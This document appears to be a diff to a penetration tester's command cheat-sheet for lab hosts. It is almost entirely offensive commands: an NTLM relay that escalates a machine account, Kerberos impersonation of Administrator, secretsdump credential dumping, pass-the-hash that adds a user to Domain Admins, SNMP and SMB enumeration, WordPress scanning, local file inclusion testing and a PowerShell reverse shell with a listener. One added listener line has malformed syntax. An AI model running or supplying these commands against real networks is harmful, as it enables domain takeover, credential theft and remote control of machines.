@@ -18,7 +18,7 @@ ntlmrelayx -t ldap://DC01.BREAKING.BAD -smb2support --escalate-user SHUTDOWN
 getST.py -spn host/DC02.BREAKING.BAD 'BREAKING.BAD/SHUTDOWN$:123soleil' -impersonate Administrator -dc-ip 192.168.56.101
 getST.py -spn host/SV01.BREAKING.BAD 'BREAKING.BAD/SHUTDOWN$:123soleil' -impersonate Administrator -dc-ip 192.168.56.101
 secretsdump -k DC02.BREAKING.BAD
-secretsdump -just-dc hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
+secretsdump -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
 rpcclient -U "" -N DC01.BREAKING.BAD
 pth-net rpc group members "Domain admins" -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
 pth-net rpc group addmem "Domain admins" Shutdown -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
@@ -84,6 +84,16 @@ smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.
 onesixtyone 192.168.10.10 private
 onesixtyone 192.168.10.10 public
 onesixtyone 192.168.10.10 manager
+onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 192.168.10.10
+snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.25.4.2.1.2
+snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.6.13.1.3
+snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.25.6.3.1.2
+snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.25.4.2.1.2
+snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.6.13.1.3
+snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.25.6.3.1.2
 cewl http://192.168.10.10/ > dictionnary.txt
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-detection aggressive
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --enumerate u
@@ -95,12 +105,14 @@ nmblookup -A 192.168.10.10
 enum4linux -n 192.168.10.10
 nmap --script 'smb-enum*' --script-args unsafe=1 -T5 192.168.10.10
 smbmap -H 192.168.10.10
+smbmap -H 192.168.10.10 -R
 smbmap -H 192.168.10.10 -R test
+smbclient -L '\\192.168.10.10'
 smbclient '\\192.168.10.10\test'
-smbclient -L '\\192.168.10.10' -N
+smbclient -N '\\192.168.10.10\test'
+smbclient -L -N '\\192.168.10.10'
 nmap --script smb-enum-shares -p 139,445 -T4 -Pn 192.168.10.10
 rpcclient -U '' -N 192.168.10.10
-smbclient '\\192.168.10.10\IPC$' -N
 enum -s 192.168.10.10
 enum -U 192.168.10.10
 enum -P 192.168.10.10
@@ -113,3 +125,4 @@ kadimus -u 'http://192.168.10.10/?page=file1.php'
 kadimus --cookie 'PHPSESSID=qsh5s21mo54qds7v5384f1q34' -u 'http://192.168.10.10/?page=file1.php'
 shellerator --reverse-shell --ip 192.168.56.1 --port 1337 --type powershell
 shellerator
+rlwrap -nc lvnp 1337
